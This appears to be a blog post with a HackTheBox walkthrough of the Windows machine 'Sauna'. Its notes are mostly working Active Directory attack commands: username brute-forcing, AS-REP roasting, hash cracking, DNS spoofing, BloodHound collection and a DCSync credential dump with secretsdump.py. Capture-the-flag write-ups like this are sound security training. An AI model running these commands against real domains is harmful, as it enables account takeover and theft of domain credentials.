---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/EJB_LiZypaM/0.jpg
layout: post
media_subpath: /assets/posts/2020-07-30-sauna-hackthebox
tags:
- asrep-roasting
- dcsync
- hackthebox
- secretsdump
- windows
title: Sauna @ HackTheBox
---

Sauna is a 20-point Windows Machine on HackTheBox. For user, we bruteforce usernames and then use ASREP-Roasting to obtain the hash of one the users. For root, we find the logon password for an account that has DCSync privileges and then use secretsdump.py to execute the attack. My walkthrough is available on youtube.

{% youtube EJB_LiZypaM %}

## Notes

**Kerbrute**

```
kerbrute userenum -d egotistical-bank.local xato-net-10-million-usernames.txt --dc sauna.htb
```

**ASREPRoast**

```
GetNPUsers.py egotistical-bank.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip sauna.htb 
```

**Hashcat**

```
hashcat -m 18200 asrep.txt rockyou.txt
```

**Dnschef**

```
sudo sh -c 'python3 dnschef.py --fakeip 10.10.10.175 --fakedomains egotistical-bank.local -q'
```

**Bloodhound**

```
bloodhound-python -c all -u svc_loanmgr -p 'password' -d egotistical-bank.local -dc egotistical-bank.local -ns 127.0.0.1
```

**Secretsdump**

```
secretsdump.py 'egotistical-bank/svc_loanmgr:password@sauna.htb'
```